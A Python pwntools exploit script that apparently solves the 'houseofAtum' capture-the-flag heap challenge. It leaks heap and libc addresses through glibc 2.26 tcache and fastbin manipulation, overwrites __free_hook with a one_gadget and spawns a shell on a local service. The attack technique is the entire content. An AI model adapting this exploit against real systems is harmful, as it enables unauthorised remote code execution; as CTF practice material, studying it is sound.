from pwn import *

#context.log_level = True
io = remote('0.0.0.0', 10001)
#io = process('./houseofAtum_debug')
libc = ELF('/usr/local/glibc-2.26/lib/libc-2.26.so')

def new(cont):
	io.sendlineafter("choice:", '1')
	io.sendafter("content:", cont)

def edit(idx, cont):
	io.sendlineafter("choice:", '2')
	io.sendlineafter("idx:", str(idx))
	io.sendafter("content:", cont)

def delete(idx, x):
	io.sendlineafter("choice:", '3')
	io.sendlineafter("idx:", str(idx))
	io.sendlineafter("(y/n):", x)

def show(idx):
	io.sendlineafter("choice:", '4')
	io.sendlineafter("idx:", str(idx))

def leak_heap():
	global heap_addr

	new("A")					# chunk0
	new(p64(0)*7 + p64(0x11))	# chunk1
	delete(1, 'y')				# tcache->entries[3]
	for i in range(6):
		delete(0, 'n')			# tcache->entries[3]
	show(0)
	io.recvuntil("Content:")
	heap_addr = u64(io.recv(6).ljust(8, '\x00'))
	log.info("heap_addr: 0x%x" % heap_addr)

def leak_libc():
	global libc_base

	delete(0, 'y')				# fastbins
	new(p64(heap_addr-0x20))	# chunk0	fake fd
	new("A")					# chunk1	fake next
	delete(1, 'y')				# fastbins

	new(p64(0) + p64(0x91))		# chunk1	fake size
	for i in range(7):
		delete(0, 'n')			# tcache->entries[7]
	delete(0, 'y')				# unsorted bin

	edit(1, "A"*0x10)
	show(1)
	io.recvuntil("A"*0x10)
	libc_base = u64(io.recv(6).ljust(8, '\x00')) - 0x3abc78
	log.info("libc_base: 0x%x" % libc_base)

def pwn():
	one_gadget = libc_base + 0xdd752
	free_hook = libc_base + libc.symbols['__free_hook']

	edit(1, p64(0) + p64(0x51) + p64(free_hook-0x10))
	new('A')					# chunk0	fake fd

	delete(0, 'y')				# fastbins
	new(p64(one_gadget))		# chunk0
	io.sendlineafter("choice:", '3')
	io.sendlineafter(":", '0')
	io.interactive()

if __name__ == '__main__':
	leak_heap()
	leak_libc()
	pwn()
